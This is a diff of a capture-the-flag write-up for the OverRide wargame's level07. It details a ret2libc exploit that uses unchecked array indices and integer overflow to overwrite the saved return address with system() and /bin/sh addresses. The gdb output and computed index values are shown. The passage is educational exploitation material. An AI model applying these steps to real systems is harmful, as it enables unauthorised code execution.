@@ -49,15 +49,15 @@ Input command: read
 ## methodology
 - ret2libc attack
 
-As we observe the behaviour of the binary upon entering various inputs and the disassembled code, we realized several things:
+As we observed the behavior of the binary with various inputs and examined the disassembled code, we realized several things:
 
-- the main functionality lies in storing and reading numbers from an array
-- there are 100 active number positions in the array
-- there are no limits for the indices, so we can access stack memory
+- the main functionality involves storing and reading numbers from an array
+- the array has 100 active number positions
+- there are no limits on indices, so we can access stack memory
 - some positions are protected (zero + indices divisible by 3)
-- information in <code>env</code> and <code>argv</code> are overwritten before the storage interface is executed (= no shellcode)
+- the `env` and `argv` are overwritten before the storage is run (= no shellcode)
 
-We continue by printing the stack variables stored on indices greater than 100:
+We start by printing stack variables stored in indices greater than 100:
 ``` shell
 level07@OverRide:/$ bash /tmp/print_stack.sh
 tab[100]: 0x1
@@ -88,10 +88,8 @@ tab[124]: 0xf7fceff4
 tab[125]: 0x0
 ```
 
-The <code>EIP</code> register resides on position 114, which is unfortunately reserved for Will.
-- <code>EIP</code> tells the computer where to go next to execute the next command and controls the flow of a program
-To access this position, we can use integer overflow:
-```
+The `EIP` register is located at position 114, which is unfortunately reserved for wil. Since the `EIP` register tells the CPU where to execute the next instruction, gaining control of it is crucial. To access this position, we use integer overflow:
+``` vbnet
 UINT_MAX = 4294967295 (+ 1 for overflow)
 
 4294967296 / 4 (int) + 114 = 1073741938
@@ -99,8 +97,8 @@ UINT_MAX = 4294967295 (+ 1 for overflow)
 └─> accessing position 1073741938 allows us to store/read to confirm we operate on 114
 ```
 
-Having access to <code>EIP</code> means we can try performing a ret2libc attack. We look for <code>system</code> and <code>/bin/sh</code> addresses only, as <code>exit</code> can be executed by the binary itself. The addresses are converted to decimal for storage in the array:
-``` shell
+Having access to `EIP` means we can perform a ret2libc attack. We only need to find the addresses of `system` and `/bin/sh`, as `exit` can be executed by the binary itself. Lets convert these addresses to decimal for storage in the array:
+``` vbnet
 (gdb) p &system
 $1 = (<text variable, no debug info> *) 0xf7e6aed0 <system>
 └─> decimal: 4159090384
@@ -110,8 +108,8 @@ $1 = (<text variable, no debug info> *) 0xf7e6aed0 <system>
 └─> decimal: 4160264172
 ```
 
-Upon testing, we realize the functional position for <code>/bin/sh</code> is 116. This means that upon binary execution, we need to make these 2 changes:
-```
+As we tested multiple positions, we found that the functional position for `/bin/sh` is 116. Therefore, upon execution of the binary, we need to make the following changes:
+``` vbnet
 position 114 = system address
 └─> tab[1073741938] = 4159090384
 
